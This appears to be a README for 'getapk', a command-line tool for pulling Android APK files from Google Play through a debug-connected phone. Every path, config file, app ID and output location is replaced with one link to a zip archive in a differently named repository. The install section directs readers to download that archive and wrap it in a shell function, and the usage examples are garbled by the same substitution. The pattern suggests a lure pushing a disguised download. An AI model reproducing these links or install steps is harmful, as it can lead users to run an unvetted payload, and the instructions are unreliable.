`getapk` is a small CLI program that allows you to download raw APK files from
the Google Play store by using an actual Android device in debugging mode.

The Android device **does not** need to be rooted.

The version of the APK is automatically checked and included in the generated
APK filename.

# Install
Clone this repo (or copy `https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip`) and add a function to your shell
(e.g. `~https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip` or `~https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip`):

```
function getapk() {
    all_args=( "$@" )
    https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip "${all_args[@]}"
}
```

# Dependencies and prerequisites
You must have:
1. `abd` installed
2. USB/wifi debugging enabled on the Android device
3. the Android device connected via USB/wifi (whichever you enabled in step 2)

# Use on a Pixel 3a
```
getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
```

# Use on something other than Pixel 3a
You will need to update the `https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip` script to set correct values for the
following variables:

```
readonly INSTALL_BUTTON_X_COORD="550" # Determined manually for Pixel 3a
readonly INSTALL_BUTTON_Y_COORD="800" # Determined manually for Pixel 3a
```

# Example output
If the APK is not yet installed on the phone:
```
$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Installing APK on the phone...
Opening APK's Play Store entry on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Tapping the Install button on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Waiting for APK to install on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Downloading APK file(s) from the phone...
APK (1/1) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
```

If the APK is already installed on the phone:
```
$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK is already installed on the phone.
Downloading APK file(s) from the phone...
APK (1/1) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
```

If the APK is multi-part:
```
$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK is already installed on the phone.
Downloading APK file(s) from the phone...
APK (1/5) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK (2/5) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK (3/5) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK (4/5) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
APK (5/5) downloaded to:
https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
```

# Known issues
- The automated clicking of the `Install` button does not work 100% of the time.
  - Observed situations where it fails: app is not free, app has some
    interstitial warning about content rating, etc
